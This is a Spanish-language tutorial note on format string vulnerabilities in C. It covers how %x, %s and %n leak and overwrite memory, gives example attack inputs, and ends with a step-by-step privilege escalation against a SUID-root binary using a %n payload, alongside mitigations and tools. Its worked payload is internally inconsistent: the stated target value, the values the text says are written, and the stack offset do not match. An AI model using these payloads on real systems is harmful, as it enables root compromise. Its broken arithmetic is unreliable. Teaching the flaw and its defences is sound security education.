---
title: "Cadenas De Formato"
date: 2026-01-26
tags:
  - ciberseguridad
  - redes-protocolos
  - vulnerabilidades-y-amenazas
---
### Cadenas de Formato (Format String Vulnerabilities) – Nota expandida


> **Relacionado**: [[01-Ciberseguridad/Fundamentos/shellcode|shellcode]]. [[02-Ciencias-Computacion/Algoritmos-EEDD/Estructuras/Puntero|Puntero]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]]. [[02-Ciencias-Computacion/Sistemas-Operativos/UNIX/comandos/chmod|chmod]]. [[01-Ciberseguridad/Redes-Protocolos/Vulnerabilidades-y-Amenazas/Escalada-de-Privilegios/Escalada-de-Privilegios|Escalada de Privilegios]].

Las **vulnerabilidades por cadenas de formato** se producen cuando una función que **interpreta formatos de texto** (como `printf()`, `sprintf()`, `fprintf()` en C) recibe una **cadena de formato controlada por el usuario sin validación**. Estas funciones analizan la cadena buscando símbolos especiales como `%s`, `%x`, `%n`, etc., que se interpretan como instrucciones para acceder a la memoria.

 Si el usuario controla la cadena de formato, **puede leer o escribir en direcciones arbitrarias de memoria**, e incluso **ejecutar código malicioso**.

---

###  ¿Dónde ocurre este problema?

En funciones como:

```c
printf("Mensaje: %s", buffer);        // Seguro (el formato es fijo)
printf(buffer);                       // ️ Vulnerable (el formato lo decide el usuario)
```

---

###  ¿Por qué es peligroso?

Porque las funciones como `printf()` **acceden a la pila (stack)** según los formatos que encuentra:

- `%x`: lee un entero hexadecimal de la pila.
    
- `%s`: interpreta el siguiente valor de la pila como una dirección y trata de imprimir la cadena allí contenida.
    
- `%n`: escribe el número de caracteres impresos hasta ahora en la dirección que se extrae de la pila (️ ¡permite escritura arbitraria!).
    

---

###  Objetivos del atacante

1. **Volcar memoria**: leer información confidencial desde la pila o heap.
    
2. **Evasión de autenticación**: obtener contraseñas, claves, tokens.
    
3. **Escritura en memoria**: sobrescribir punteros de función o direcciones de retorno.
    
4. **Ejecución de código arbitrario**: redirigir el flujo del programa a shellcode.
    

---

###  Ejemplo práctico de vulnerabilidad

#### Código vulnerable (C):

```c
void vulnerable(char *input) {
    char buffer[256];
    strcpy(buffer, input);
    printf(buffer);  // ️ vulnerabilidad
}
```

#### Ataque: volcar memoria

```bash
./vulnprog "%x %x %x %x %x"
```

️ Resultado: imprime contenido de la pila (posibles direcciones, claves, estructuras internas).

#### Ataque: lectura arbitraria

```bash
./vulnprog "\x10\x01\x48\x08 %08x.%08x.%08x.%s"
```

- Si `\x10\x01\x48\x08` es la dirección de una cadena en memoria, `%s` imprimirá su contenido.
    

#### Ataque: escritura arbitraria (peligroso)

```bash
./vulnprog "\x10\x01\x48\x08%08x.%08x.%08x.%n"
```

- El `%n` escribe el número total de caracteres impresos en la dirección indicada por los primeros bytes de la cadena.
    

---

### ️ Explotación avanzada: Format String + Shellcode

1. Se coloca el shellcode en el entorno del proceso (por ejemplo, con una variable de entorno o cadena de entrada).
    
2. Se usa `%n` para sobrescribir la **dirección de retorno** de una función o puntero de función hacia la ubicación del shellcode.
    
3. Cuando se devuelve de la función, el programa **salta al shellcode** y se obtiene una **shell remota**.
    

---

###  Condiciones necesarias para la explotación

- La aplicación debe usar funciones de formato inseguras (`printf(cadena_usuario)`).
    
- El atacante debe poder:
    
    - Proporcionar la cadena de formato.
        
    - Saber (o adivinar) direcciones útiles en memoria.
        
- No debe haber protecciones activas como:
    
    - ASLR (randomiza direcciones).
        
    - Stack canaries (detectan sobrescritura de la pila).
        
    - DEP/NX (bloquea ejecución de código en zonas de datos).
        

---

### ️ Contramedidas

|Nivel|Mitigación|
|---|---|
|**Código**|Nunca pasar cadenas del usuario como formato directamente (`printf(input)` ).|
|**Compilador**|Usar `-Wformat -Werror=format-security` en GCC para forzar errores en casos peligrosos.|
|**Sistema**|Activar ASLR, DEP, Stack Canaries.|
|**Auditoría**|Usar herramientas de análisis estático y dinámico (`Valgrind`, `Flawfinder`, `AddressSanitizer`).|

---

###  Herramientas útiles para explotación

|Herramienta|Función|
|---|---|
|`gdb` / `pwndbg`|Análisis de memoria en programas vulnerables|
|`formatstringhelper.py`|Calcular payloads con `%n` y dirección exacta|
|`peda`|Extensión para GDB que facilita la explotación|
|`Metasploit`|Tiene módulos de explotación para `format string` en software vulnerable|

---

### Conclusión

Las vulnerabilidades de **cadenas de formato son críticas**, especialmente si permiten escritura arbitraria con `%n`. Aunque menos comunes que los desbordamientos de buffer, siguen apareciendo en código heredado o escrito sin medidas de seguridad. Para desarrolladores y analistas de seguridad, es esencial **entender, detectar y corregir** este patrón antes de que sea explotado.

---

Para hacer **una escalada de privilegios usando una vulnerabilidad de cadenas de formato (`format string`)**, se aprovecha el uso inseguro de funciones como `printf()` que permiten al atacante **leer o escribir memoria arbitraria**. En particular, **el especificador `%n` permite escribir en direcciones que el atacante controla**, lo que puede llevar a sobrescribir direcciones críticas (por ejemplo, punteros de retorno o funciones) y ejecutar código con permisos elevados.

Vamos a ver un ejemplo **realista y técnico paso a paso**, usando un binario vulnerable en Linux con SUID (`root`) y un payload que te da una shell como root.

---

###  Escalada de privilegios con Format String – Paso a paso

####  1. Código vulnerable (C)

```c
#include <stdio.h>
#include <stdlib.h>

void vulnerable(char *input) {
    char buffer[512];
    sprintf(buffer, input);  // ️ input controlado por el usuario
    printf(buffer);
}

int main(int argc, char **argv) {
    if (argc > 1)
        vulnerable(argv[1]);
    return 0;
}
```

- El programa está **marcado como SUID root**:
    

```bash
chmod u+s vulnerable
chown root:root vulnerable
```

---

####  2. Objetivo: sobrescribir una dirección de retorno o un puntero de función

Supón que existe en memoria un puntero a función o dirección de retorno accesible y predecible. Si puedes **escribir bytes en esa dirección**, puedes redirigir el flujo de ejecución a un shellcode (por ejemplo, `/bin/sh`).

---

####  3. Determinar la posición del argumento en la pila

```bash
./vulnerable AAAA.%x.%x.%x.%x.%x.%x.%x
```

Resultado:

```text
AAAA.0.0.bffff12c.41414141.b7e6bffc.bffff128.12345678
```

La cadena `"AAAA"` se ve como `0x41414141`, lo que nos permite determinar **la posición del input en la pila** (por ejemplo, el 5.º argumento).

---

#### ️ 4. Construir payload para escribir en una dirección crítica

Supón que queremos escribir `0x08048484` (dirección del shellcode) en `0x0804a010` (puntero de función).

Payload típico en formato:

```bash
python3 -c 'print("\x10\xa0\x04\x08" + "\x11\xa0\x04\x08" + "%4919x%5$n%123x%6$n")'
```

Esto hace:

- Imprimir `4919` caracteres antes de usar `%5$n` → escribe 0x1337 en `0x0804a010`.
    
- Luego escribe `0x80` en `0x0804a011` con `%6$n`.
    
- Se divide la dirección a escribir en bloques de 1 byte y se escribe con múltiples `%n`.
    

> Hay scripts como [`formatstringhelper`](https://github.com/hellman/libformatstr) o funciones de pwntools que automatizan esto.

---

####  5. Resultado: ejecución del shellcode como root

Si el exploit sobrescribe una dirección de retorno o función con la dirección de tu shellcode (`/bin/sh`), cuando el programa devuelva o invoque la función, **salta al shellcode** y se ejecuta como **root**, porque el binario es SUID.

```bash
whoami
root
```

---

###  Condiciones necesarias para que funcione

- El binario vulnerable **debe ser SUID**.
    
- El programa debe contener una llamada vulnerable como `printf(input)`.
    
- Debe ser posible predecir o calcular direcciones en memoria (difícil con ASLR).
    
- El sistema no debe tener protecciones activas como:
    
    - **ASLR** (aleatorización de direcciones).
        
    - **DEP/NX** (protege ejecución en la pila).
        
    - **Stack canaries** (detectan cambios en la pila).
        

---

### ️ Cómo se evita esta escalada

- Nunca usar `printf(variable_usuario)` directamente.
    
- Usar compiladores con protección: `-Wformat -Werror=format-security`.
    
- Activar ASLR, NX, StackGuard y otras protecciones a nivel de sistema.
    
- Rechazar input sospechoso o no validado en C, C++, etc.
    

---

### Conclusión

Una escalada de privilegios mediante **format strings** permite a un atacante escribir en direcciones arbitrarias, sobrescribir punteros de función o direcciones de retorno, y ejecutar su propio código con privilegios elevados (root). Aunque menos comunes hoy gracias a las protecciones modernas, **aún existen en software heredado y sistemas embebidos**.

---